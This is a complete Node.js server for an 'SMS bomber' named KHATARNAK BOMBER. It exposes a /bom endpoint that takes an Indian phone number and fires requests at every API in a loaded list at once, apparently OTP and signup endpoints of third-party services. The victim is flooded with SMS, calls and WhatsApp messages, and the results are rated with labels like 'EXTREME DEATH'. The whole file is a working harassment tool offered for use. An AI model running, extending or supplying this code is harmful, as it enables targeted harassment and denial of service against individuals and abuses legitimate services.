// KHATARNAK BOMBER - OPTIMIZED VERSION
// Run: node server.js

const http = require('http');
const https = require('https');

const PORT = 3700;
const DEFAULT_KEY = 'demo';

// ============= LOAD APIS =============
const { ALL_APIS, getTotalCount } = require('./apis.js');

let ALL_APIS_LIST = ALL_APIS;
let TOTAL_APIS = getTotalCount();

// Remove duplicates based on name
const uniqueApis = new Map();
for (const api of ALL_APIS_LIST) {
    if (!uniqueApis.has(api.name)) {
        uniqueApis.set(api.name, api);
    }
}
ALL_APIS_LIST = Array.from(uniqueApis.values());
TOTAL_APIS = ALL_APIS_LIST.length;

console.log(`🔥 Loaded ${TOTAL_APIS} unique APIs`);

// ============= GET API TYPE =============
function getApiType(name) {
    const n = name.toLowerCase();
    if (n.includes('voice') || n.includes('call')) return 'call';
    if (n.includes('whatsapp')) return 'whatsapp';
    return 'sms';
}

// ============= GET DATA =============
function getData(api, phone) {
    try {
        if (api.data && typeof api.data === 'function') {
            return api.data(phone);
        }
        if (api.data && typeof api.data === 'string') {
            return api.data.replace(/{}|{phone}/g, phone);
        }
        return null;
    } catch {
        return null;
    }
}

// ============= GET URL =============
function getUrl(api, phone) {
    try {
        let url = api.url;
        if (typeof url === 'function') {
            url = url(phone);
        }
        if (typeof url === 'string') {
            url = url.replace(/{}|{phone}/g, phone);
        }
        return url;
    } catch {
        return null;
    }
}

// ============= FASTER API CALLER =============
function callApi(api, phone) {
    return new Promise((resolve) => {
        const timeoutId = setTimeout(() => {
            resolve({ name: api.name, success: false, error: 'timeout', type: getApiType(api.name) });
        }, 3000); // Reduced to 3 seconds timeout
        
        try {
            let finalUrl = getUrl(api, phone);
            if (!finalUrl) {
                clearTimeout(timeoutId);
                resolve({ name: api.name, success: false, error: 'no url', type: getApiType(api.name) });
                return;
            }
            
            const isPost = api.method === "POST";
            const headers = { ...api.headers, "User-Agent": "Mozilla/5.0" };
            let data = null;
            
            if (isPost) {
                data = getData(api, phone);
                if (data) {
                    headers["Content-Type"] = headers["Content-Type"] || "application/json";
                }
            }
            
            const lib = finalUrl.startsWith('https') ? https : http;
            const parsed = new URL(finalUrl);
            
            const options = {
                hostname: parsed.hostname,
                port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                path: parsed.pathname + parsed.search,
                method: api.method,
                headers: headers,
                timeout: 3000
            };
            
            const req = lib.request(options, (res) => {
                clearTimeout(timeoutId);
                let body = '';
                res.on('data', () => {});
                res.on('end', () => {
                    resolve({ 
                        name: api.name, 
                        success: res.statusCode >= 200 && res.statusCode < 400, 
                        status: res.statusCode,
                        type: getApiType(api.name)
                    });
                });
            });
            
            req.on('error', () => {
                clearTimeout(timeoutId);
                resolve({ name: api.name, success: false, error: 'request error', type: getApiType(api.name) });
            });
            
            if (isPost && data) {
                req.write(data);
            }
            req.end();
        } catch (err) {
            clearTimeout(timeoutId);
            resolve({ name: api.name, success: false, error: 'exception', type: getApiType(api.name) });
        }
    });
}

// ============= SERVER =============
const server = http.createServer(async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Content-Type', 'application/json');
    
    const parsedUrl = new URL(req.url, `http://${req.headers.host}`);
    const path = parsedUrl.pathname;
    const query = parsedUrl.searchParams;
    
    // Root endpoint
    if (path === '/') {
        return res.end(JSON.stringify({
            status: "💀 KHATARNAK BOMBER API",
            total_apis: TOTAL_APIS,
            key: DEFAULT_KEY,
            usage: "/bom?key=bombom763&num=9876543210",
            status_endpoint: "/status?key=bombom763"
        }, null, 2));
    }
    
    // Status endpoint
    if (path === '/status') {
        const key = query.get('key');
        if (key !== DEFAULT_KEY) {
            res.statusCode = 401;
            return res.end(JSON.stringify({ error: "Invalid API key" }));
        }
        return res.end(JSON.stringify({
            status: "ok",
            api_key: key,
            total_apis: TOTAL_APIS,
            uptime: process.uptime(),
            timestamp: new Date().toISOString()
        }, null, 2));
    }
    
    // Bomb endpoint
    if (path === '/bom') {
        const key = query.get('key');
        const phone = query.get('num');
        
        if (key !== DEFAULT_KEY) {
            res.statusCode = 401;
            return res.end(JSON.stringify({ error: "Invalid API key. Use: bombom763" }));
        }
        
        if (!phone || !/^[6-9]\d{9}$/.test(phone)) {
            res.statusCode = 400;
            return res.end(JSON.stringify({ error: "Invalid phone number. Use 10 digits starting with 6-9" }));
        }
        
        console.log(`\n💣 BOMBING: +91${phone} | ${TOTAL_APIS} APIs`);
        const startTime = Date.now();
        
        // Parallel execution - all at once
        const promises = ALL_APIS_LIST.map(api => callApi(api, phone));
        const results = await Promise.all(promises);
        
        const endTime = Date.now();
        const successful = results.filter(r => r.success).length;
        const successRate = ((successful / TOTAL_APIS) * 100).toFixed(2);
        const execTime = endTime - startTime;
        
        const callSuccess = results.filter(r => r.type === 'call' && r.success).length;
        const smsSuccess = results.filter(r => r.type === 'sms' && r.success).length;
        const whatsappSuccess = results.filter(r => r.type === 'whatsapp' && r.success).length;
        
        let intensity = "💀 WEAK";
        if (successRate >= 70) intensity = "💀💀💀💀💀 EXTREME DEATH";
        else if (successRate >= 50) intensity = "💀💀💀💀 NUCLEAR";
        else if (successRate >= 30) intensity = "💀💀💀 KILLER";
        else if (successRate >= 15) intensity = "💀💀 MODERATE";
        
        console.log(`✅ ${successful}/${TOTAL_APIS} | ${successRate}% | ${execTime}ms`);
        
        return res.end(JSON.stringify({
            status: "success",
            target: `+91${phone}`,
            total_apis: TOTAL_APIS,
            successful: successful,
            failed: TOTAL_APIS - successful,
            success_rate: `${successRate}%`,
            call: callSuccess,
            sms: smsSuccess,
            wp_sms: whatsappSuccess,
            execution_time_ms: execTime,
            execution_time_sec: (execTime / 1000).toFixed(2),
            intensity: intensity,
            timestamp: new Date().toISOString()
        }, null, 2));
    }
    
    res.statusCode = 404;
    res.end(JSON.stringify({ error: "Not found. Use /bom?key=bombom763&num=9876543210" }));
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n💀💀💀 KHATARNAK BOMBER API RUNNING 💀💀💀`);
    console.log(`📡 Total APIs: ${TOTAL_APIS}`);
    console.log(`⚡ Timeout: 3 seconds per API`);
    console.log(`🔗 http://localhost:${PORT}/bom?key=bombom763&num=9876543210\n`);
});
